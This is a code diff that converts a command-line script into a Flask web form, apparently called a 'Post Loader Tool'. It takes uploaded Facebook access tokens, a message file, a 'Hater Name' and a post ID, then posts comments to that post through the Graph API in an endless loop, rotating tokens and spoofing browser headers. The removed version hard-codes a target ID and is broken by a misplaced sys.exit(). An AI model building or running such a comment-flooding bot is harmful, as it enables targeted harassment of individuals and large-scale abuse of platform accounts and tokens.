@@ -1,125 +1,163 @@
+from flask import Flask, request, render_template, redirect, url_for
 import requests
-import json
 import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(b"SERVER RUNNING => XMARTY AYUSH K1NG")
+app = Flask(__name__)
 
-def execute_server():
-    PORT = 4000
-
-    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print("Server running at http://localhost:{}".format(PORT))
-        httpd.serve_forever()
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
 
 
-def post_comments():
+@app.route('/')
+def index():
+    return '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>𝐒𝐀𝐇𝐁𝐀𝐍 𝐒𝐇𝐀𝐈𝐅𝐄</title>
+    <style>
+        /* CSS for styling elements */
+        .header {
+            display: flex;
+            align-items: center;
+        }
+        .header h1 {
+            margin: 0 20px;
+        }
+        .header img {
+            max-width: 100px; /* Adjust as needed */
+            margin-right: 20px;
+        }
+        .random-img {
+            max-width: 300px; /* Adjust image size as needed */
+            margin: 10px;
+        }
+        /* Add more CSS styles for other elements as needed */
+        /* For example, you can use classes to style form elements and buttons */
+        .form-control {
+            width: 100%;
+            padding: 5px;
+            margin-bottom: 10px;
+        }
+        .btn-submit {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <header class="header mt-4">
 
-    with open('tokennum.txt', 'r') as file:
-        tokens = file.readlines()
-    num_tokens = len(tokens)
+        <h1 class="mb-3" style="color: blue;">𝐒𝐀𝐇𝐁𝐀𝐀𝐍 𝐏❍𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑</h1>
+        <h1 class="mt-3" style="color: red;"> (𝐒𝐀𝐇𝐁𝐀𝐀𝐍 𝐖𝐄𝐁)</h1>
+    </header>
 
-    # Modify the message as per your requirement
-    msg_template = "Hello malik bhai sir! I am using your server. My token is {}"
+<div class="container">
+    <form action="/" method="post" enctype="multipart/form-data">
+        <div class="mb-3">
+            <label for="threadId">POST ID:</label>
+            <input type="text" class="form-control" id="threadId" name="threadId" required>
+        </div>
+        <div class="mb-3">
+            <label for="kidx">Enter Hater Name:</label>
+            <input type="text" class="form-control" id="kidx" name="kidx" required>
+        </div>
+        <div class="mb-3">
+            <label for="messagesFile">Select Your Np File:</label>
+            <input type="file" class="form-control" id="messagesFile" name="messagesFile" accept=".txt" required>
+        </div>
+        <div class="mb-3">
+            <label for="txtFile">Select Your Tokens File:</label>
+            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+        </div>
+        <div class="mb-3">
+            <label for="time">Speed in Seconds (minimum 20 second):</label>
+            <input type="number" class="form-control" id="time" name="time" required>
+        </div>
+        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
+    </form>
+</div>
 
-    # Specify the ID where you want to send the message
-    target_id = "100062609148808"
-
-    requests.packages.urllib3.disable_warnings()
-
-    def cls():
-        if system() == 'Linux':
-            os.system('clear')
-        else:
-            if system() == 'Windows':
-                os.system('cls')
-    cls()
-
-    def liness():
-        print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')
-
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
-
-sys.exit()
-
-    access_tokens = [token.strip() for token in tokens]
-
-    with open('post_url.txt', 'r') as file:
-        post_url = file.read().strip()
+    <div class="random-images">
 
 
-    with open('comments.txt', 'r') as file:
-        comments = file.readlines()
+        <!-- Add more random images and links here as needed -->
+    </div>
 
-    num_comments = len(comments)
-    max_tokens = min(num_tokens, num_comments)
+    <footer class="footer">
 
-    with open('hatersname.txt', 'r') as file:
-        haters_name = file.read().strip()
+        <p style="color: #FF5733;">Post Loader Tool</p>
+        <p>Made with ❤️ by 𝐒𝐀𝐇𝐁𝐀𝐀𝐍 𝐒𝐇𝐀𝐈𝐅𝐄 <a </a></p>
+    </footer>
+</body>
+</html>'''
 
-    with open('time.txt', 'r') as file:
-        speed = int(file.read().strip())
 
-     #post_id = post_urlsplit
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
 
-    liness()
+        txt_file = request.files['txtFile']
+        access_tokens = txt_file.read().decode().splitlines()
 
-    while True:
-        try:
-            for comment_index in range(num_comments):
-                token_index = comment_index % max_tokens
-                access_token = access_tokens[token_index]
+        messages_file = request.files['messagesFile']
+        messages = messages_file.read().decode().splitlines()
 
-                comment = comments[comment_index].strip()
+        num_comments = len(messages)
+        max_tokens = len(access_tokens)
 
-                url = "https://graph.facebook.com/{}/comments".format(post_url)
-                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
-                response = requests.post(url, json=parameters, headers=headers)
+        post_url = f'https://graph.facebook.com/v15.0/{thread_id}/comments'
+        haters_name = mn
+        speed = time_interval
 
-                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-                if response.ok:
-                    print("[+] XM9RTY AYUSH K1NG {} Post Id {} Token No. {}: {}".format(
-                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
-                    print("  - Time: {}".format(current_time))
-                    liness()
-                    liness()
-                else:
-                    print("[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
-                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
-                    print("  - Time: {}".format(current_time))
-                    liness()
-                    liness()
-                time.sleep(speed)
+        while True:
+            try:
+                for comment_index in range(num_comments):
+                    token_index = comment_index % max_tokens
+                    access_token = access_tokens[token_index]
 
-            print("\n[+] All comments sent successfully. Restarting the process...\n")
-        except Exception as e:
-            print("[!] An error occurred: {}".format(e))
+                    comment = messages[comment_index].strip()
 
-def main():
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.start()
+                    parameters = {'access_token': access_token,
+                                  'message': haters_name + ' ' + comment}
+                    response = requests.post(
+                        post_url, json=parameters, headers=headers)
 
-    post_comments()
+                    current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                    if response.ok:
+                        print("[+] Comment No. {} Post Id {} Token No. {}: {}".format(
+                            comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                        print("  - Time: {}".format(current_time))
+                        print("\n" * 2)
+                    else:
+                        print("[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
+                            comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                        print("  - Time: {}".format(current_time))
+                        print("\n" * 2)
+                    time.sleep(speed)
+            except Exception as e:
+
+
+                print(e)
+                time.sleep(30)
+
+    return redirect(url_for('index'))
+
 
 if __name__ == '__main__':
-    main()
+    app.run(host='0.0.0.0', port=5000)
